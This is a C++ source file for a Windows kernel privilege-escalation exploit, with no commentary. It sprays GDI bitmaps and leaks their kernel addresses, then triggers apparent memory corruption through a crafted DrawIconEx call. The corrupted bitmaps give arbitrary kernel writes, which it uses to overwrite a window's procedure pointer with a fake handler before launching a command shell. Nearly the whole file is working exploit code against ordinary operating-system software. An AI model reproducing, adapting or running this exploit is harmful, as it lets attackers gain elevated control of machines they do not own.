#include <windows.h>
#include <iostream>
#include <intrin.h>
#include "leak.h"
using namespace std;


leak    p_leak;
HBITMAP phBitmap[0x2000] = { 0 };
PVOID   kernel[0x2000]   = { 0 };
HBITMAP hManage, hWorker;
PVOID   hManage_kernel, hWorker_kernel;
EXTERN_C LRESULT __fastcall WndProc_fake(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
constexpr auto lpWndProc_offset = 0x90;





int main(int argc, char *argv[])
{

    LoadLibrary(L"user32.dll");
    HDC r0 = CreateCompatibleDC(0x0);
    HDC allocate = CreateCompatibleDC(0x0);

    HBITMAP r1 = CreateCompatibleBitmap(r0, 0x51500, 0x100);
    auto kernelAddress = p_leak.GetGdiKernelAddress(r1);
    cout << "kernelAddress:0x" << hex << kernelAddress << endl;

    for (size_t i = 0; i < 0x2000; i++)
    {
        phBitmap[i] = CreateCompatibleBitmap(allocate, 0x6f000, 0x08);
        kernel[i] = p_leak.GetGdiKernelAddress(phBitmap[i]);
    }
    for (size_t i = 0; i < 0x2000; i++)
    {
        ULONG_PTR dst = (ULONG_PTR)kernel[i];
        ULONG_PTR src = (ULONG_PTR)kernelAddress + 0x100070000;
        if (dst == src)
        {
            hManage = phBitmap[i];
            hWorker = phBitmap[i+1];
            hManage_kernel = kernel[i];
            hWorker_kernel = kernel[i+1];
            cout << "found hManage:0x" << hex << dst << endl;
            cout << "found hWorker:0x" << hex << kernel[i+1] << endl;
        }
    }

    SelectObject(r0, r1);

    //__debugbreak();
    DrawIconEx(r0, 0x900, 0xb, (HICON)0x40000010003, 0x0, 0xffe00000,
        0x0, 0x0, 0x1);


    WNDCLASSEX wndCLass3 = { 0 };
    wndCLass3.cbSize = sizeof(WNDCLASSEX);
    wndCLass3.lpfnWndProc = DefWindowProc;
    wndCLass3.lpszClassName = L"exploit class";

    RegisterClassEx(&wndCLass3);

    auto hwnd = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        L"exploit class",
        L"The title of my window",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 240, 120,
        NULL, NULL, NULL, NULL);

    auto hwnd_kernel = p_leak.GetUserObjectAddressBygSharedInfo(hwnd, NULL);
    cout << "hwnd_kernel: 0x" << hex << hwnd_kernel << endl;


    ULONG cb = (ULONG)((ULONG_PTR)hWorker_kernel + 0x50 - ((ULONG_PTR)hManage_kernel + 0x238));
    auto pvbits = malloc(cb);

    GetBitmapBits(hManage, cb, pvbits);
    *(PULONG_PTR)((PBYTE)pvbits + cb) = (ULONG_PTR)hwnd_kernel + lpWndProc_offset;
    SetBitmapBits(hManage, cb + sizeof(ULONG_PTR), pvbits);
    ULONG_PTR data = (ULONG_PTR)WndProc_fake;
    SetBitmapBits(hWorker, sizeof(ULONG_PTR), (void*)&data);
    SendMessage(hwnd, WM_NULL, NULL, NULL);

    system("cmd");


    return 0;
}